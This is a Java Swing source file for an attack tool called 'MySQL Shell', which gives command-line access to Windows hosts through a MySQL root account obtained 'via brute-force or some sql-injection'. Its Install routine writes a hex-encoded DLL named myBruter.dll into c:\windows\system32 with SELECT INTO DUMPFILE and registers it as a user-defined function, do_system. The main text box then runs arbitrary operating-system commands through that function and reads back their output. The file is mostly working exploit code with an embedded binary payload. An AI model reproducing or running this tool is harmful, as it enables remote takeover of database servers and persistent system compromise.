import com.mysql.jdbc.Connection;
import com.mysql.jdbc.Statement;
import java.awt.event.KeyEvent;
import java.io.*;
import java.io.IOException;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.util.ArrayList;
import javax.swing.JFileChooser;
import javax.swing.UIManager;

public class Main extends javax.swing.JFrame {

    /** Creates new form Main */
    public Main() {
        initComponents();
    }

    /** This method is called from within the constructor to
     * initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is
     * always regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jFrameConnect = new javax.swing.JFrame();
        jPanel1 = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        jTextFieldServer = new javax.swing.JTextField();
        jLabel2 = new javax.swing.JLabel();
        jTextFieldUser = new javax.swing.JTextField();
        jTextFieldPass = new javax.swing.JTextField();
        jLabel3 = new javax.swing.JLabel();
        jButtonConnect = new javax.swing.JButton();
        jFrameAbout = new javax.swing.JFrame();
        jPanel3 = new javax.swing.JPanel();
        jLabel4 = new javax.swing.JLabel();
        jLabel5 = new javax.swing.JLabel();
        jLabel6 = new javax.swing.JLabel();
        jLabel7 = new javax.swing.JLabel();
        jLabel8 = new javax.swing.JLabel();
        jLabel9 = new javax.swing.JLabel();
        jPanel2 = new javax.swing.JPanel();
        jScrollPane1 = new javax.swing.JScrollPane();
        jTextAreaOutput = new javax.swing.JTextArea();
        jTextField4 = new javax.swing.JTextField();
        jMenuBar1 = new javax.swing.JMenuBar();
        jMenu1 = new javax.swing.JMenu();
        jMenuItem1 = new javax.swing.JMenuItem();
        jMenuItem2 = new javax.swing.JMenuItem();
        jMenuItem6 = new javax.swing.JMenuItem();
        jMenuItem7 = new javax.swing.JMenuItem();
        jMenu2 = new javax.swing.JMenu();
        jMenuItem3 = new javax.swing.JMenuItem();
        jMenuItem4 = new javax.swing.JMenuItem();

        jFrameConnect.setTitle("Connect...");
        jFrameConnect.setBounds(new java.awt.Rectangle(400, 400, 0, 0));
        jFrameConnect.setResizable(false);

        jLabel1.setText("Server:");

        jTextFieldServer.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jTextFieldServerActionPerformed(evt);
            }
        });

        jLabel2.setText("User:");

        jTextFieldPass.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jTextFieldPassActionPerformed(evt);
            }
        });

        jLabel3.setText("Pass:");

        jButtonConnect.setText("Connect");
        jButtonConnect.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButtonConnectActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addGroup(jPanel1Layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(jButtonConnect))
                    .addGroup(jPanel1Layout.createSequentialGroup()
                        .addGap(10, 10, 10)
                        .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                            .addComponent(jLabel1)
                            .addComponent(jLabel2)
                            .addComponent(jLabel3))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                            .addComponent(jTextFieldPass, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, 128, Short.MAX_VALUE)
                            .addComponent(jTextFieldUser, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, 128, Short.MAX_VALUE)
                            .addComponent(jTextFieldServer, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, 128, Short.MAX_VALUE))))
                .addContainerGap())
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel1)
                    .addComponent(jTextFieldServer, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jTextFieldUser, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel2))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jTextFieldPass, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel3))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jButtonConnect)
                .addContainerGap(30, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout jFrameConnectLayout = new javax.swing.GroupLayout(jFrameConnect.getContentPane());
        jFrameConnect.getContentPane().setLayout(jFrameConnectLayout);
        jFrameConnectLayout.setHorizontalGroup(
            jFrameConnectLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jFrameConnectLayout.createSequentialGroup()
                .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        jFrameConnectLayout.setVerticalGroup(
            jFrameConnectLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jFrameConnectLayout.createSequentialGroup()
                .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jFrameAbout.setTitle("About");
        jFrameAbout.setBounds(new java.awt.Rectangle(400, 400, 0, 0));
        jFrameAbout.setResizable(false);

        jPanel3.setBorder(new javax.swing.border.SoftBevelBorder(javax.swing.border.BevelBorder.RAISED));

        jLabel4.setFont(new java.awt.Font("Tahoma", 1, 10));
        jLabel4.setText("MySQL Shell:");

        jLabel5.setText("Provide command line access to Windows boxes through MySQL;");

        jLabel6.setText("Writes myBruter.dll into c:\\windows\\system32\\;");

        jLabel7.setFont(new java.awt.Font("Tahoma", 1, 10));
        jLabel7.setText("Requires:");

        jLabel8.setText("MySQL root account (via brute-force or some sql-injection kung-fu);");

        jLabel9.setText("www.mylosploit.com");

        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);
        jPanel3.setLayout(jPanel3Layout);
        jPanel3Layout.setHorizontalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel3Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jLabel4)
                    .addComponent(jLabel5)
                    .addComponent(jLabel6)
                    .addComponent(jLabel7)
                    .addComponent(jLabel8)
                    .addComponent(jLabel9))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        jPanel3Layout.setVerticalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel3Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jLabel4)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel5)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel6)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jLabel7)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jLabel8)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jLabel9)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout jFrameAboutLayout = new javax.swing.GroupLayout(jFrameAbout.getContentPane());
        jFrameAbout.getContentPane().setLayout(jFrameAboutLayout);
        jFrameAboutLayout.setHorizontalGroup(
            jFrameAboutLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jFrameAboutLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jPanel3, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        jFrameAboutLayout.setVerticalGroup(
            jFrameAboutLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jFrameAboutLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jPanel3, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("MySQL Shell");
        setBackground(new java.awt.Color(102, 153, 255));
        setBounds(new java.awt.Rectangle(400, 400, 400, 400));
        setResizable(false);

        jPanel2.setBackground(new java.awt.Color(255, 255, 255));

        jTextAreaOutput.setColumns(20);
        jTextAreaOutput.setEditable(false);
        jTextAreaOutput.setFont(new java.awt.Font("Lucida Sans Unicode", 0, 12));
        jTextAreaOutput.setLineWrap(true);
        jTextAreaOutput.setRows(5);
        jScrollPane1.setViewportView(jTextAreaOutput);

        jTextField4.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyPressed(java.awt.event.KeyEvent evt) {
                jTextField4KeyPressed(evt);
            }
        });

        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
        jPanel2.setLayout(jPanel2Layout);
        jPanel2Layout.setHorizontalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jTextField4, javax.swing.GroupLayout.DEFAULT_SIZE, 610, Short.MAX_VALUE)
            .addComponent(jScrollPane1, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 610, Short.MAX_VALUE)
        );
        jPanel2Layout.setVerticalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 285, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jTextField4, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
        );

        jMenu1.setText("File");

        jMenuItem1.setText("Connect");
        jMenuItem1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem1ActionPerformed(evt);
            }
        });
        jMenu1.add(jMenuItem1);

        jMenuItem2.setText("Disconnect");
        jMenuItem2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem2ActionPerformed(evt);
            }
        });
        jMenu1.add(jMenuItem2);

        jMenuItem6.setText("About");
        jMenuItem6.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem6ActionPerformed(evt);
            }
        });
        jMenu1.add(jMenuItem6);

        jMenuItem7.setText("Exit");
        jMenuItem7.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem7ActionPerformed(evt);
            }
        });
        jMenu1.add(jMenuItem7);

        jMenuBar1.add(jMenu1);

        jMenu2.setText("Tools");

        jMenuItem3.setText("Install");
        jMenuItem3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem3ActionPerformed(evt);
            }
        });
        jMenu2.add(jMenuItem3);

        jMenuItem4.setText("Uninstall");
        jMenuItem4.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem4ActionPerformed(evt);
            }
        });
        jMenu2.add(jMenuItem4);

        jMenuBar1.add(jMenu2);

        setJMenuBar(jMenuBar1);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel2, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel2, javax.swing.GroupLayout.PREFERRED_SIZE, 312, javax.swing.GroupLayout.PREFERRED_SIZE)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

private void jMenuItem1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem1ActionPerformed
    jFrameConnect.pack();
    jFrameConnect.setVisible(true);
}//GEN-LAST:event_jMenuItem1ActionPerformed

private void jButtonConnectActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButtonConnectActionPerformed
    /**
     * Connect to MySQL database, using the server, user and pass from the JTextFields.
     *  
     */
    try {
        String server = jTextFieldServer.getText().trim();
        String user = jTextFieldUser.getText().trim();
        String pass = jTextFieldPass.getText().trim();

        Class.forName("com.mysql.jdbc.Driver");
        String connectionUrl = "jdbc:mysql://" + server + "/";
        con = (Connection) DriverManager.getConnection(connectionUrl,user,pass);
        jTextAreaOutput.setText("Connected to remote server...");
        jFrameConnect.setVisible(false);    
    } catch (Exception e) {
        jTextAreaOutput.setText("Error (connect): " + e);
    }
    
}//GEN-LAST:event_jButtonConnectActionPerformed

private void jMenuItem2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem2ActionPerformed
    try {
        if (con.isValid(0)) {
            con.close();
            jTextAreaOutput.setText("Disconnected.");
            System.out.println("Disconnect...");
        } else {
            System.out.println("No current connection...");
        }
    } catch (Exception e) {
        System.out.println("Error (disconnect): " + e);
    }
}//GEN-LAST:event_jMenuItem2ActionPerformed

private void jMenuItem7ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem7ActionPerformed
    try {
        System.exit(1);       
    } catch (Exception e) {
        System.out.println("Error (exit): " + e);
    }
}//GEN-LAST:event_jMenuItem7ActionPerformed

private void jMenuItem3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem3ActionPerformed
    //
    // Putting the myBruter.dll into c:\windows\system32 and creating mysqlstomp database
    // Remember to delete myBruter.dll when finished up, and drop mysqlstomp database.
    // The tool will attempt a best effort clean, but won't be able to get rid of the .dll
    // Thats a job for the user :-)

    try {    
        String SQL = "select 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000F00000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000004350529007313CC307313CC307313CC3843961C305313CC307313DC30D313CC3023D61C304313CC3023D33C306313CC3023D63C300313CC3023D5CC305313CC3023D60C306313CC3023D66C306313CC35269636807313CC3000000000000000000000000000000000000000000000000504500004C010400085AF2410000000000000000E0000E210B01070A00040000000800000000000034110000001000000020000000000010001000000002000004000000000000000400000000000000005000000004000000000000020000000000100000100000000010000010000000000000100000006022000064000000442100003C000000000000000000000000000000000000000000000000000000004000007C000000302000001C0000000000000000000000000000000000000000000000000000008820000048000000000000000000000000200000300000000000000000000000000000000000000000000000000000002E746578740000005C030000001000000004000000040000000000000000000000000000200000602E72646174610000C4020000002000000004000000080000000000000000000000000000400000402E64617461000000280000000030000000020000000C0000000000000000000000000000400000C02E72656C6F630000920000000040000000020000000E00000000000000000000000000004000004200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000566800200000FF15142000108BF08B4424108B0883C40483F901740433C05EC38B40088B0851FF15282000108B154C2000108916A1502000108946048BC683C4048D50018A084084C975F98B4C24142BC28B54240840890189720C8BC65EC3CC8B4424048B400C85C0740A89442404FF2508200010C38B44240885C0750E3905143000107E2EFF0D1430001083F8018B0D102000108B09890D18300010754F6880000000FF151420001085C059A320300010750433C0EB79832000A120300010A31C300010E88C010000689A120010E870010000C70424043000106800300010E833010000FF051430001059EB3F85C0753CA12030001085C07433EB138B0D1C3000108B0985C97407FFD1A120300010832D1C3000100439051C30001073DE50FF1508200010832520300010005933C040C20C006A0C6858200010E8C401000033C0408945E433FF897DFC8B750C3BF7750C393D143000100F84AC0000003BF0740583FE027531A1243000103BC7740CFF751056FF7508FFD08945E4397DE40F8485000000FF751056FF7508E8E5FEFFFF8945E43BC774728B5D105356FF7508E83F0100008945E483FE01750E3BC7750A5357FF7508E8BBFEFFFF3BF7740583FE0375295356FF7508E8A8FEFFFF85C07503897DE4397DE47413A1243000103BC7740A5356FF7508FFD08945E4834DFCFF8B45E4EB1A8B45EC8B088B095051E8DA0000005959C38B65E8834DFCFF33C0E82A010000C20C00FF250C200010833D20300010FF7506FF2520200010681C3000106820300010FF74240CE81601000083C40CC3FF742404E8D1FFFFFFF7D81BC0F7D85948C36A0C6868200010E8A2000000C745E438210010817DE43821001073228365FC008B45E48B0085C0740BFFD0EB0733C040C38B65E8834DFCFF8345E404EBD5E8A6000000C36A0C6878200010E85E000000C745E440210010817DE44021001073228365FC008B45E48B0085C0740BFFD0EB0733C040C38B65E8834DFCFF8345E404EBD5E862000000C3FF2524200010837C2408017513833D2430001000750AFF742404FF150020001033C040C20C00685013001064A100000000508B442410896C24108D6C24102BE05356578B45F88965E8508B45FCC745FCFFFFFFFF8945F88D45F064A300000000C38B4DF064890D00000000595F5E5BC951C3FF2518200010FF251C20001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003222000000000000C4210000D8210000E4210000BA210000062200001A22000028220000F4210000B02100000000000000000000085AF241000000000200000053000000D0200000D0080000537563636573730000000000FFFFFFFFF61100100712001000000000FFFFFFFF831200108712001000000000FFFFFFFFC7120010CB1200100000000048000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010300010302100100100000052534453CE2B154C7C561145A1FD80E9B17CE4840C000000683A5C706572736F6E616C5C626F6F6B735C446268685C6D7973716C5C746573745F7564665C52656C656173655C746573745F7564662E70646200000000000000000000000000005013000000000000000000000000000000000000882100000000000000000000CC210000082000008021000000000000000000004E2200000020000000000000000000000000000000000000000000003222000000000000C4210000D8210000E4210000BA210000062200001A22000028220000F4210000B0210000000000001B0373797374656D0000DF026D616C6C6F630000AC026672656500004D5356435237312E646C6C003F015F696E69747465726D00BB005F61646A7573745F6664697600004C005F5F4370705863707446696C74657200F1005F6578636570745F68616E646C65723300006B005F5F646C6C6F6E6578697400B8015F6F6E6578697400840044697361626C655468726561644C69627261727943616C6C73004B45524E454C33322E646C6C00000000000000000000085AF241000000009C2200000100000002000000020000008822000090220000982200000010000060100000A9220000B322000000000100746573745F7564662E646C6C00646F5F73797374656D00646F5F73797374656D5F6465696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004EE640BB0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000064000000083028302E30353071308030883091309930A630AE30BC30C130CB30D730DC30E730F330FF300C311231193122312831373154316831DB311A32203229322E323332593265326C329D32A932B032E032ED32FA32053352335833000000200000180000005C3060306C3070307C308030C430C83000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 into dumpfile \'c:/windows/system32/myBruter.dll\';";
        Statement stmt = (Statement) con.createStatement();
        ResultSet rs = stmt.executeQuery(SQL);
        rs.close();
    } catch (Exception e) {
        System.out.println("Error (install): " + e);
    }
    try {
        String SQL = "create database mysqlstomp;";
        Statement stmt = (Statement) con.createStatement();
        stmt.execute(SQL);
    }   catch (Exception e) {
        System.out.println("Error (install): " + e);
    }
    try {
        String SQL = "use mysqlstomp";
        Statement stmt = (Statement) con.createStatement();
        stmt.execute(SQL);
    }   catch (Exception e) {
        System.out.println("Error (install): " + e);
    }
    try {
        String SQL = "create function do_system returns string soname \'myBruter.dll\';";
        Statement stmt = (Statement) con.createStatement();
        stmt.execute(SQL);
    }   catch (Exception e) {
        System.out.println("Error (install): " + e);
    }

    System.out.println("Install ok.");
    jTextAreaOutput.setText("Install ok...");
        

}//GEN-LAST:event_jMenuItem3ActionPerformed

private void jMenuItem4ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem4ActionPerformed
        try {
        String SQL = "use mysqlstomp;";
        Statement stmt = (Statement) con.createStatement();
        stmt.execute(SQL);
        SQL = "drop function do_system;";
        stmt.execute(SQL);
        SQL = "drop database mysqlstomp;";
        stmt.execute(SQL);
        System.out.println("Un-install ok.");
        jTextAreaOutput.setText("Un-install ok...");
        //Also remember to delete the .dll, try to do it here if you can.
        } catch (Exception e) {
            System.out.println("Error (uninstall): " + e);
        }
        
}//GEN-LAST:event_jMenuItem4ActionPerformed

public void testMethod(String theString) {

}
private void jTextField4KeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_jTextField4KeyPressed
    if (evt.getKeyCode()==KeyEvent.VK_ENTER) {
        if (!jTextField4.getText().equalsIgnoreCase("")) {
        try {
            
            String SQL = "select do_system(\'" + jTextField4.getText().trim() + " > foo.txt\');";
            Statement stmt = (Statement) con.createStatement();
            stmt.execute(SQL);
            SQL = "select load_file(\'foo.txt\');";
            ResultSet rs = stmt.executeQuery(SQL);
            jTextAreaOutput.setText("");
            while (rs.next()) {                    
                //System.out.println(rs.getString(1));
                jTextAreaOutput.append(rs.getString(1) + "\n");             
            }
            rs.close();
           
            jTextField4.setText("");
        } catch (Exception e) {
            System.out.println(e);
        }
        }
    }
}//GEN-LAST:event_jTextField4KeyPressed

private void jMenuItem6ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem6ActionPerformed
    jFrameAbout.pack();
    jFrameAbout.setVisible(true);
}//GEN-LAST:event_jMenuItem6ActionPerformed

private void jTextFieldServerActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jTextFieldServerActionPerformed
    // TODO add your handling code here:
}//GEN-LAST:event_jTextFieldServerActionPerformed

private void jTextFieldPassActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jTextFieldPassActionPerformed
    // TODO add your handling code here:
}//GEN-LAST:event_jTextFieldPassActionPerformed
public static ArrayList loadFile(String theFile) {
   
        String line;
        ArrayList file = new ArrayList();

        try
        {    
           FileReader fr = new FileReader(theFile); // read a file
           BufferedReader in = new BufferedReader(fr);

            if (!in.ready())
                throw new IOException();

            while ((line = in.readLine()) != null)
                file.add(line);

            in.close();
        }
        catch (IOException e)
        {
            System.out.println(e);
            return null;
        }

        return file;
    
}
    /**
    * @param args the command line arguments
    */
    public static void main(String args[]) {
    try {
        UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
    } catch (Exception e) {
        System.out.println(e);
    }
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new Main().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton jButtonConnect;
    private javax.swing.JFrame jFrameAbout;
    private javax.swing.JFrame jFrameConnect;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private javax.swing.JLabel jLabel8;
    private javax.swing.JLabel jLabel9;
    private javax.swing.JMenu jMenu1;
    private javax.swing.JMenu jMenu2;
    private javax.swing.JMenuBar jMenuBar1;
    private javax.swing.JMenuItem jMenuItem1;
    private javax.swing.JMenuItem jMenuItem2;
    private javax.swing.JMenuItem jMenuItem3;
    private javax.swing.JMenuItem jMenuItem4;
    private javax.swing.JMenuItem jMenuItem6;
    private javax.swing.JMenuItem jMenuItem7;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JPanel jPanel3;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTextArea jTextAreaOutput;
    private javax.swing.JTextField jTextField4;
    private javax.swing.JTextField jTextFieldPass;
    private javax.swing.JTextField jTextFieldServer;
    private javax.swing.JTextField jTextFieldUser;
    // End of variables declaration//GEN-END:variables
    public static Connection con;
    JFileChooser fc = new JFileChooser();
     ArrayList<String> passwords = new ArrayList();

}
